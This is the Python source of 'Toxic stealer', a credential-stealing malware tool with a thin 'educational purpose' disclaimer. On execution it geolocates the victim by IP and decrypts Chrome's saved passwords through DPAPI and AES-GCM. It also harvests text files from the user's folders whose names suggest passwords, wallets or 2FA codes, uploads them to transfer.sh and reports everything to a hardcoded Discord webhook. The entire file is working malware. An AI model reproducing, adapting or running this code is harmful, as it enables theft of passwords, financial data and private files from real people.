""" Toxic stealer is a stealer graber thanks for downloading it
hope you will like use don't 
don't forget to make you report at my discord BKS#1958
if you like you must take a look to spyse wich is a discord tool
a lot of update are coming so stay connect (token etc)
this stealer is only for educational purpose and must not be used as malicious way 
I decline all responsability how you use it 
Plague is down ! fuck world
#I'm_pystyle
"""


from numbers import Number
import requests, os, threading, requests,os,sys,shutil,json,base64,requests
from shutil import rmtree, make_archive
from time import timezone
from os import walk, path, mkdir
from json import loads, dumps

try:
    import pyautogui, platform, sqlite3
    from urllib.request import Request, urlopen
    from datetime import datetime
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives.ciphers import (
        Cipher, algorithms, modes)
    from PIL import ImageGrab
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives.ciphers import (
        Cipher, algorithms, modes)
    from zipfile import *
except:
    os.system("pip install urllib")
    os.system("pip install platform")
    os.system("pip install sqlite3")
    os.system("pip install pillow")
    os.system("pip install zipfile")
    os.system("pip install crypto")
    os.system("pip install cryptography")


Webhook_Here = "https://discord.com/api/webhooks/1037270936191258684/sZpwvKzgeH0SKqib7ohWd39o_Zl31L6rorncUqxrbA5Cch7bpexV6s6dDtRperhYUo2N"
DB_PATH = r'Google\Chrome\User Data\Default\Login Data'

temp = os.getenv('TEMP')
user = temp.split("\AppData")[0] 
username = os.getenv("USERNAME")
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")

words = ["passw","mdp","motdepasse","mot_de_passe","login","secret","account","acount","paypal",
            "banque","account","metamask","wallet","crypto","exodus","discord","2fa","code","memo","compte""backup","secret"
        ]

path2search = [
        user + r"\Desktop",
        user + r"\Downloads",
        user + r"\Documents",
        user + r"\OneDrive\Desktop",
        user + r"\OneDrive\Downloads",
        user + r"\OneDrive\Documents",
        user + r"\Bureau",
        user + r"\T??l??chargements",
        user + r"\Documents",
        user + r"\OneDrive\Bureau",
        user + r"\OneDrive\T??l??chargement",
        user + r"\OneDrive\Documents",
    ]

headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

url = {
    'ip': 'http://ipinfo.io/json',
    '_ip_' : 'https://jsonip.com/',
    'transfer' : "https://transfer.sh/",
    'global_info' : "http://ip-api.com/json/"
}

temp_file_path = {
    'password' : temp + '\\' + f'Toxic Passwords.txt',
    'vacum' : temp + '\\' + f'out\Toxic',
    'repertory' : temp + '\\' + f'out'
}

def get_ip():
    try:
        try:
            resp = requests.get(url["ip"])
            json = resp.json()
            ip = json['ip']
            
            return ip
        except:
            ip = False
            return ip 
    except:
        resp = requests.get(url["_ip_"])
        json = resp.json()
        ip = json['ip']
            
        return ip

#incoming feature
def get_screen():
    screen = pyautogui.screenshot()
    screen.save('image.jpg')

def LoadUrlib(hook, data='', files='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(hook, data=data, headers=headers))
                return r
            else:
                r = urlopen(Request(hook, data=data))
                return r
        except: 
            pass

def global_info_pc():
    
    global loc, org, city, region, postal, time_zone, flag
    
    try:
        resp = requests.get(url['ip'])
        json = resp.json()
        
        city = json["city"]
        region = json["region"]
        postal = json["postal"]
        loc = json['loc']
        org = json['org']
        time_zone = json['timezone']
        
        country = json['country']
        if country == 'FR':
            flag = ":flag_fr:"
        if country == 'US':
            flag = ":flag_us"
        else:
            flag = ':flag_fr:'
    except:
        cont = f"{url['global_info']}{get_ip()}"
        resp = requests.get(cont)
        json = resp.json()

        if "status" == "fail":
            city = 'No city found'
            region = 'No region found'
            loc = 'No loc'
            org = "No org"
            time_zone = 'cant find timezone'
            country = ':flag_eu'

        city = json["city"]
        region = json["region"]
        loc = f"{json['lat']},{json['lon']}"
        org = json['org']
        time_zone = 'cant find timezone'

        country = json['countryCode']
        if country == 'FR':
            flag = ":flag_fr:"
        if country == 'US':
            flag = ":flag_us:"
        if country == 'AU':
            flag = ":flag_au:"
        else:
            flag = ':flag_eu:'
       
def global_info_pc_embed(username):
    data = {
        "content": f"`{get_ip()} - {username} ` ",
        "embeds": [
            {
            "color": 14406413,
            "fields": [
                {
                    "name": ":biohazard: Login :",
                    "value": f"`{username}`"
                },
                {
                    "name": "   :timer: Time Zone :",
                    "value": f"`{time_zone}`",
                    "inline": True
                },
                {
                    "name": "    :crown: Country :",
                    "value": f"{flag}",
                    "inline": True
                },
                {
                    "name": "   :globe_with_meridians: IP :",
                    "value": f"`{get_ip()}`\n[Click to see location](https://www.google.fr/maps/@{loc})",
                    "inline": True
                },
                ],
            "author": {
                "name": f"{username}",
                "icon_url": "https://cdn.discordapp.com/attachments/1019303407590313994/1036311557048635392/unknown.png"
                },
            "footer": {
                "text": "@Toxic",
                "icon_url": "https://cdn.discordapp.com/attachments/1019303407590313994/1036311557048635392/unknown.png"
                },
            "thumbnail": {
                "url": "https://cdn.discordapp.com/attachments/1019303407590313994/1036311557048635392/unknown.png"
                }
            }
        ],
        "avatar_url": "https://cdn.discordapp.com/attachments/1019303407590313994/1036311557048635392/unknown.png",
        "username": "Toxic",
        "attachments": []
        }

    LoadUrlib(Webhook_Here, data=dumps(data).encode(), headers=headers)

def file_vacum_embed(file_list,url_list,):

    webhook = Webhook_Here

    data = {
            "content": f"`{get_ip()} - {username}`",
            "embeds": [
            {
            "color": 14406413,
            "fields": [
                {
                "name": f" found in {found_path}",
                "value": '------------------------------------------'
                },
                {
                "name": f"  ???? Interesting files found on user :",
                "value": '\n'.join(f'?????????? [{f}]({u})' for f, u in zip(file_list, url_list))
                }
            ],
            "author": {
                "name": "toxic | file vacuum "
            },
            "footer": {
                "text": "@Toxic",
                "icon_url": "https://cdn.discordapp.com/attachments/1019303407590313994/1036311557048635392/unknown.png"
            }
            }
        ],
        "username": "Toxic",
        "avatar_url": "https://cdn.discordapp.com/attachments/1019303407590313994/1036311557048635392/unknown.png",
        "attachments": []
            }
    LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)

def file_vacum():
    global found_path
    name_list = []
       
    try:
        os.mkdir(temp_file_path['repertory'])
    except:
        shutil.rmtree(temp_file_path['repertory'])
        os.mkdir(temp_file_path['repertory'])
    
    exts = ['txt']
        

    for path_ in path2search:
        
        for root, dirs, files in walk(path_):
                
            for name in files:
                fullpath = path.join(root, name)
                    
                if any(word in name for word in words) and any(name.endswith('.' + ext) for ext in exts):
                        
                    try:
                            
                        with open(fullpath, 'rb') as f:
                            content = f.read()
                            
                        

                        name, *subnames, ext = name.split('.')
                        name = '.'.join([name, *subnames])
                        name_list.append(name)
                        
                        path_file = f'{temp_file_path["vacum"]} {name}.txt'
                        found_path = path_   
                        with open(path_file, 'wb') as d:
                            d.write(content)
                        
                    except Exception as e:
                        print(e)

def upload_file_to_transfer_sh():

    global url_list
    global file_list
    
    path = temp_file_path["repertory"]
    url_list = []
    file_list = []
    
    for file in os.listdir(path):
        
        name = file
        file_list.append(name)
        files = { "file": open(path + '\\' + name , 'rb')}
        upload = requests.post(url['transfer'],
                         files=files)
        url_ = upload.text
        
        if url_ == 'Too Many Requests\n':
            continue
            #url_ = requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path + '\\' + name, 'rb')}).json()["data"]["downloadPage"]    
        url_list.append(url_)

def password():

    def decrypt(cipher, ciphertext, nonce):
        cipher.mode = modes.GCM(nonce)
        decryptor = cipher.decryptor()
        return decryptor.update(ciphertext)

    def get_cipher(key):
        cipher = Cipher(
            algorithms.AES(key),
            None,
            backend=default_backend()
        )
        return cipher


    def dpapi_decrypt(encrypted):
        import ctypes
        import ctypes.wintypes

        class DATA_BLOB(ctypes.Structure):
            _fields_ = [('cbData', ctypes.wintypes.DWORD),
                        ('pbData', ctypes.POINTER(ctypes.c_char))]

        p = ctypes.create_string_buffer(encrypted, len(encrypted))
        blobin = DATA_BLOB(ctypes.sizeof(p), p)
        blobout = DATA_BLOB()
        retval = ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
        if not retval:
            raise ctypes.WinError()
        result = ctypes.string_at(blobout.pbData, blobout.cbData)
        ctypes.windll.kernel32.LocalFree(blobout.pbData)
        return result

    def get_key_from_local_state():
        jsn = None
        with open(os.path.join(os.environ['LOCALAPPDATA'],
            r"Google\Chrome\User Data\Local State"),encoding='utf-8',mode ="r") as f:
            jsn = json.loads(str(f.readline()))
        return jsn["os_crypt"]["encrypted_key"]

    def aes_decrypt(encrypted_txt):
        encoded_key = get_key_from_local_state()
        encrypted_key = base64.b64decode(encoded_key.encode())
        encrypted_key = encrypted_key[5:]
        key = dpapi_decrypt(encrypted_key)
        nonce = encrypted_txt[3:15]
        cipher = get_cipher(key)
        return decrypt(cipher,encrypted_txt[15:],nonce)

    class ChromePassword:
        def __init__(self):
            self.passwordList = []

        def get_chrome_db(self):
            _full_path = os.path.join(local,DB_PATH)
            _temp_path = os.path.join(local,'sqlite_file')
            if os.path.exists(_temp_path):
                os.remove(_temp_path)
            shutil.copyfile(_full_path,_temp_path)
            self.show_password(_temp_path)

        def show_password(self,db_file):
            conn = sqlite3.connect(db_file)
            _sql = 'select signon_realm,username_value,password_value from logins'
            for row in conn.execute(_sql):
                host = row[0]
                if host.startswith('android'):
                    continue
                name = row[1]
                value = self.chrome_decrypt(row[2])
                _info = 'Hostname: %s\nUsername: %s\nPassword: %s\n\n' %(host,name,value)
                self.passwordList.append(_info)
            conn.close()
            os.remove(db_file)

        def chrome_decrypt(self,encrypted_txt):
            if sys.platform == 'win32':
                try:
                    if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                        decrypted_txt = dpapi_decrypt(encrypted_txt)
                        return decrypted_txt.decode()
                    elif encrypted_txt[:3] == b'v10':
                        decrypted_txt = aes_decrypt(encrypted_txt)
                        return decrypted_txt[:-16].decode()
                except WindowsError:
                    return None
            else:
                try:
                    return unix_decrypt(encrypted_txt)
                except NotImplementedError:
                    return None

        def save_passwords(self):
            intro = '<<<---------------- Toxic ------------------->>>\n'
            with open(temp_file_path["password"],'w',encoding='utf-8') as f:
                f.writelines(self.passwordList)

    if __name__=="__main__":
        Main = ChromePassword()
        Main.get_chrome_db()
        Main.save_passwords()
        
def password_embed():
    
    files = { "file": open(temp_file_path['password'], 'rb')}
    upload = requests.post(url['transfer'],
                files=files)
    url_ = upload.text

    f = open(temp_file_path['password'], 'r')
    text= f.readlines()
    NumberOfLine = len(text)
    NumberOfLine = NumberOfLine / 3
    data = {
        "content": f"`{get_ip()} - {username} `", 
        "embeds": [
            {
            "color": 14406413,
            "fields": [
                {
                    "name": "Toxic password stealer",
                    "value": f"--------------------------------------"
                },
                {
                    "name": "Password Data",
                    "value": f""":link: - {url_}\n:key: **{NumberOfLine}**  - Password found """
                },
                ],
            "author": {
                "name": f"",
                "icon_url": "https://cdn.discordapp.com/attachments/1019303407590313994/1036311557048635392/unknown.png"
                },
            "footer": {
                "text": "@Toxic",
                "icon_url": "https://cdn.discordapp.com/attachments/1019303407590313994/1036311557048635392/unknown.png"
                },
            "thumbnail": {
                "url": "https://cdn.discordapp.com/attachments/1019303407590313994/1036311557048635392/unknown.png"
                }
            }
        ],
        "avatar_url": "https://cdn.discordapp.com/attachments/1019303407590313994/1036311557048635392/unknown.png",
        "username": "Toxic",
        "attachments": []
        }
    # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
    LoadUrlib(Webhook_Here, data=dumps(data).encode(), headers=headers)

def launch_password():
    password()
    password_embed()

def launch_vacumm():
    threading.Thread(target = file_vacum()).start()
    upload_file_to_transfer_sh()
    file_vacum_embed(file_list,url_list)

def launch_global():
    global_info_pc()
    global_info_pc_embed(username)

def main():
    launch_global()
    launch_password()
    launch_vacumm()

threading.Thread(target = main()).start()
